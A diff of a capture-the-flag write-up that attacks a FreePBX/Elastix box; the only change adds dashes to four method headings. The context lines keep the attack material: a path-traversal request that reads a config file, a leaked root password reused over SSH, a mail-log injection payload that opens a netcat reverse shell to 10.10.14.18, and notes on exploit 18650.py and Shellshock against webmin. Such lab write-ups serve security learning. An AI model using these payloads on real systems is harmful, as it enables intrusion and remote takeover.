@@ -90,7 +90,7 @@ FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                          
 ```
 
 ## User
-### Method 1 php/webapps/37637.pl and Password Reuse
+### Method 1 - php/webapps/37637.pl and Password Reuse
 Using 37637.pl, we can simply open burp and perform the following request:
 ```
 GET /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action HTTP/1.1
@@ -167,7 +167,7 @@ ASTLOGDIR=/var/log/asteriskSorry! Attempt to access restricted file.
 Here, we can see repeatedly more than once the password ```jEhdIekWmdjE```, we can test if this box is affected from a password reuse vulnerability.
 We can try to ssh as root into the box using the the discovered password, and as we can se we do get a prompt
 
-### Method 2 php/webapps/37637.pl getting RCE from LFI using SMTP
+### Method 2 - php/webapps/37637.pl getting RCE from LFI using SMTP
 Always by using 37637.pl, we can get an RCE from a LFI.
 From the initial nmap scan, we can see that port 25 (smtp) is opened.
 We know that using smtp we can send email connecting to port 25, when we send emails, a file is written under /var/mail/%RCPT_USER%.
@@ -257,7 +257,7 @@ Content-Length: 175
 current_language=../../../../../../../..//var/mail/asterisk%00&module=Accounts&action=&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.18+4444+>/tmp/f
 ```
 
-### Method 3 php/webapps/18650.py
+### Method 3 - php/webapps/18650.py
 As discovered in the initial enumeration phase we have another exploit (18650.py) that is elegible for a successul exploitation.
 In the variable section we can notice that we are required to set an "extension" variable.
 ```
@@ -297,7 +297,7 @@ extension="233"
 ```
 Now, we can setup a netcat listener on port 443 and get a reverse shell.
 
-### Method 4 Shellshock
+### Method 4 - Shellshock
 as we can see from the initial nmap scan, a service called webmin is running on port 10000.
 Because webmin is using lots of .cgi files we can try to shellshock this service and see if we can get a shell.
 With burp, we can try to intercept the login page and change the user-agent as follow:
